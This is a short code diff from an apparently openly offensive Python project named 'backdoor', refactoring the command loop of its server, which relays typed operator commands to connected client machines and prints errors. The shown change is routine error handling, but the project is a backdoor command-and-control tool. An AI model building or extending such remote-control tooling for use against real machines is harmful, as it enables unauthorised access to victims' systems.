@@ -8,6 +8,7 @@ from backdoor.messages.exchange.server import ServerExchangeMapper
 from backdoor.messages.messenger import SocketMessenger
 from backdoor.messages.protocol import SocketProtocol
 from backdoor.models.client import ClientModel
+from backdoor.models.commands import Command
 from backdoor.serialization.jsonserializer import JsonSerializer
 
 
@@ -37,9 +38,15 @@ class Server:
 
         while (inp := self.__get_input()) != "exit":
             command = self.converter.convert(inp)
+            self.__perform_command(client, command)
+
+    def __perform_command(self, client: ClientModel, command: Command) -> None:
+        try:
             self.processor.pre_process(command)
             result = self.exchanger.exchange(client, command)
             self.processor.post_process(command, result)
+        except ValueError as e:
+            print('err: ' + str(e))
 
     def __accept_connection(self) -> ClientModel:
         sock, addr = self.socket.accept()
